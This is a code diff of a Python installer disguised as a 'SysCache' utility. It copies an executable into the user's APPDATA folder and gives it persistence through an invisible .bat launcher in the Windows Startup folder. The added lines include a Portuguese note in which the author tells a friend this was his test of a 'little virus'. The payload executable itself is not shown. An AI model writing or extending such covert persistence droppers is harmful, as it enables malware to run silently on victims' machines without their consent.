@@ -1,3 +1,4 @@
+import logging
 import os
 import shutil
 import sys
@@ -5,6 +6,16 @@ import subprocess
 
 APP_NAME = "SysCache"
 INSTALL_DIR = os.path.join(os.getenv("APPDATA"), APP_NAME)
+LOG_FILE = os.path.join(INSTALL_DIR, "syscache.log")
+
+logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+
+def create_readme():
+    readme_path = os.path.join(INSTALL_DIR, "README_ANDREY.txt")
+    with open(readme_path, "w") as f:
+        f.write("Oi, Andrey! Aqui eh o Will.\n")
+        f.write("Fiz esse teste aqui de um viruszinho e voce foi meu primeiro teste hehe.\n")
+        f.write("Parabens por ter encontrado!\n")
 
 def create_install_dir():
     if not os.path.exists(INSTALL_DIR):
@@ -16,15 +27,15 @@ def get_resource_path(filename):
     return os.path.join(os.path.abspath("."), filename)
 
 def copy_files():
-    src = get_resource_path("main_script.py")
-    dst = os.path.join(INSTALL_DIR, "main_script.py")
+    src = get_resource_path("main_script.exe")
+    dst = os.path.join(INSTALL_DIR, "main_script.exe")
 
     shutil.copy(src, dst)
 def create_startup():
     startup = os.path.join(os.getenv("APPDATA"),
                            r"Microsoft\Windows\Start Menu\Programs\Startup")
 
-    script_path = os.path.join(INSTALL_DIR, "main_script.py")
+    script_path = os.path.join(INSTALL_DIR, "main_script.exe")
 
     # cria um .bat invisível
     bat_path = os.path.join(INSTALL_DIR, "run.bat")
